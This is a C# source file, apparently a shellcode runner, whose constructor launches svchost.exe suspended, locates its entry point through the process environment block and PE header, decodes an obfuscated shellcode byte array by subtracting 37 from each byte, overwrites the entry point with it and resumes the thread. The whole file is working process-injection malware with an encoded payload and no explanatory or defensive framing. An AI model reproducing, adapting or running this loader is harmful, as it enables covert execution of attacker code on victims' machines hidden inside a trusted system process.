using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;

namespace Runner {

[ComVisible(true)]
public class TestClass
{

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
	struct STARTUPINFO
	{
		public Int32 cb;
		public IntPtr lpReserved;
		public IntPtr lpDesktop;
		public IntPtr lpTitle;
		public Int32 dwX;
		public Int32 dwY;
		public Int32 dwXSize;
		public Int32 dwYSize;
		public Int32 dwXCountChars;
		public Int32 dwYCountChars;
		public Int32 dwFillAttribute;
		public Int32 dwFlags;
		public Int16 wShowWindow;
		public Int16 cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}

	[StructLayout(LayoutKind.Sequential)]
	internal struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public int dwProcessId;
		public int dwThreadId;
	}

	[StructLayout(LayoutKind.Sequential)]
	internal struct PROCESS_BASIC_INFORMATION
	{
		public IntPtr Reserved1;
		public IntPtr PebAddress;
		public IntPtr Reserved2;
		public IntPtr Reserved3;
		public IntPtr UniquePid;
		public IntPtr MoreReserved;
	}

	[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
	static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

	[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
	private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

	[DllImport("kernel32.dll", SetLastError = true)]
	static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern uint ResumeThread(IntPtr hThread);

	[DllImport("kernel32.dll")]
	static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);


	public TestClass()
    {

		STARTUPINFO si = new STARTUPINFO();
		PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
		bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
		IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

		PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
		uint tmp = 0;
		IntPtr hProcess = pi.hProcess;
		ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
		IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

		byte[] addrBuf = new byte[IntPtr.Size];
		IntPtr nRead = IntPtr.Zero;
		ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
		IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

		byte[] data = new byte[0x200];
		ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

		uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
		uint opthdr = e_lfanew_offset + 0x28;
		uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
		IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

		byte[] buf = new byte[] { 0x21, 0x6d, 0xa8, 0x09, 0x15, 0x0d, 0xf1, 0x25, 0x25, 0x25, 0x66, 0x76, 0x66, 0x75, 0x77, 0x6d, 0x56, 0xf7, 0x76, 0x7b, 0x8a, 0x6d, 0xb0, 0x77, 0x85, 0x6d, 0xb0, 0x77, 0x3d, 0x6d, 0xb0, 0x77, 0x45, 0x72, 0x56, 0xee, 0x6d, 0xb0, 0x97, 0x75, 0x6d, 0x34, 0xdc, 0x6f, 0x6f, 0x6d, 0x56, 0xe5, 0xd1, 0x61, 0x86, 0xa1, 0x27, 0x51, 0x45, 0x66, 0xe6, 0xee, 0x32, 0x66, 0x26, 0xe6, 0x07, 0x12, 0x77, 0x66, 0x76, 0x6d, 0xb0, 0x77, 0x45, 0xb0, 0x67, 0x61, 0x6d, 0x26, 0xf5, 0x8b, 0xa6, 0x9d, 0x3d, 0x30, 0x27, 0x34, 0xaa, 0x97, 0x25, 0x25, 0x25, 0xb0, 0xa5, 0xad, 0x25, 0x25, 0x25, 0x6d, 0xaa, 0xe5, 0x99, 0x8c, 0x6d, 0x26, 0xf5, 0x69, 0xb0, 0x65, 0x45, 0x6e, 0x26, 0xf5, 0x75, 0xb0, 0x6d, 0x3d, 0x08, 0x7b, 0x72, 0x56, 0xee, 0x6d, 0x24, 0xee, 0x66, 0xb0, 0x59, 0xad, 0x6d, 0x26, 0xfb, 0x6d, 0x56, 0xe5, 0x66, 0xe6, 0xee, 0x32, 0xd1, 0x66, 0x26, 0xe6, 0x5d, 0x05, 0x9a, 0x16, 0x71, 0x28, 0x71, 0x49, 0x2d, 0x6a, 0x5e, 0xf6, 0x9a, 0xfd, 0x7d, 0x69, 0xb0, 0x65, 0x49, 0x6e, 0x26, 0xf5, 0x8b, 0x66, 0xb0, 0x31, 0x6d, 0x69, 0xb0, 0x65, 0x41, 0x6e, 0x26, 0xf5, 0x66, 0xb0, 0x29, 0xad, 0x6d, 0x26, 0xf5, 0x66, 0x7d, 0x66, 0x7d, 0x83, 0x7e, 0x7f, 0x66, 0x7d, 0x66, 0x7e, 0x66, 0x7f, 0x6d, 0xa8, 0x11, 0x45, 0x66, 0x77, 0x24, 0x05, 0x7d, 0x66, 0x7e, 0x7f, 0x6d, 0xb0, 0x37, 0x0e, 0x70, 0x24, 0x24, 0x24, 0x82, 0x6e, 0xe3, 0x9c, 0x98, 0x57, 0x84, 0x58, 0x57, 0x25, 0x25, 0x66, 0x7b, 0x6e, 0xae, 0x0b, 0x6d, 0xa6, 0x11, 0xc5, 0x26, 0x25, 0x25, 0x6e, 0xae, 0x0a, 0x6e, 0xe1, 0x27, 0x25, 0x26, 0xe0, 0xe5, 0xcd, 0x56, 0x92, 0x66, 0x79, 0x6e, 0xae, 0x09, 0x71, 0xae, 0x16, 0x66, 0xdf, 0x71, 0x9c, 0x4b, 0x2c, 0x24, 0xfa, 0x71, 0xae, 0x0f, 0x8d, 0x26, 0x26, 0x25, 0x25, 0x7e, 0x66, 0xdf, 0x4e, 0xa5, 0x90, 0x25, 0x24, 0xfa, 0x8f, 0x2f, 0x66, 0x83, 0x75, 0x75, 0x72, 0x56, 0xee, 0x72, 0x56, 0xe5, 0x6d, 0x24, 0xe5, 0x6d, 0xae, 0xe7, 0x6d, 0x24, 0xe5, 0x6d, 0xae, 0xe6, 0x66, 0xdf, 0x0f, 0x34, 0x04, 0x05, 0x24, 0xfa, 0x6d, 0xae, 0xec, 0x8f, 0x35, 0x66, 0x7d, 0x71, 0xae, 0x07, 0x6d, 0xae, 0x1e, 0x66, 0xdf, 0xbe, 0xca, 0x99, 0x86, 0x24, 0xfa, 0xaa, 0xe5, 0x99, 0x2f, 0x6e, 0x24, 0xf3, 0x9a, 0x0a, 0x0d, 0xb8, 0x25, 0x25, 0x25, 0x6d, 0xa8, 0x11, 0x35, 0x6d, 0xae, 0x07, 0x72, 0x56, 0xee, 0x8f, 0x29, 0x66, 0x7d, 0x6d, 0xae, 0x1e, 0x66, 0xdf, 0x27, 0xfe, 0xed, 0x84, 0x24, 0xfa, 0xa8, 0x1d, 0x25, 0xa3, 0x7a, 0x6d, 0xa8, 0xe9, 0x45, 0x83, 0xae, 0x1b, 0x8f, 0x65, 0x66, 0x7e, 0x8d, 0x25, 0x35, 0x25, 0x25, 0x66, 0x7d, 0x6d, 0xae, 0x17, 0x6d, 0x56, 0xee, 0x66, 0xdf, 0x7d, 0xc9, 0x78, 0x0a, 0x24, 0xfa, 0x6d, 0xae, 0xe8, 0x6e, 0xae, 0xec, 0x72, 0x56, 0xee, 0x6e, 0xae, 0x15, 0x6d, 0xae, 0xff, 0x6d, 0xae, 0x1e, 0x66, 0xdf, 0x27, 0xfe, 0xed, 0x84, 0x24, 0xfa, 0xa8, 0x1d, 0x25, 0xa2, 0x4d, 0x7d, 0x66, 0x7c, 0x7e, 0x8d, 0x25, 0x65, 0x25, 0x25, 0x66, 0x7d, 0x8f, 0x25, 0x7f, 0x66, 0xdf, 0x30, 0x54, 0x34, 0x55, 0x24, 0xfa, 0x7c, 0x7e, 0x66, 0xdf, 0x9a, 0x93, 0x72, 0x86, 0x24, 0xfa, 0x6e, 0x24, 0xf3, 0x0e, 0x61, 0x24, 0x24, 0x24, 0x6d, 0x26, 0xe8, 0x6d, 0x4e, 0xeb, 0x6d, 0xaa, 0x1b, 0x9a, 0xd9, 0x66, 0x24, 0x0c, 0x7d, 0x8f, 0x25, 0x7e, 0x6e, 0xec, 0xe7, 0x15, 0xda, 0xc7, 0x7b, 0x24, 0xfa,  };

		for (int i = 0; i < buf.Length; i++)
		{

			buf[i] = (byte)(((uint)buf[i] - 37) & 0xFF);
		}

		WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
		ResumeThread(pi.hThread);
	}
	[STAThread]
    	static void Main()
    	{
    	}		
}
}
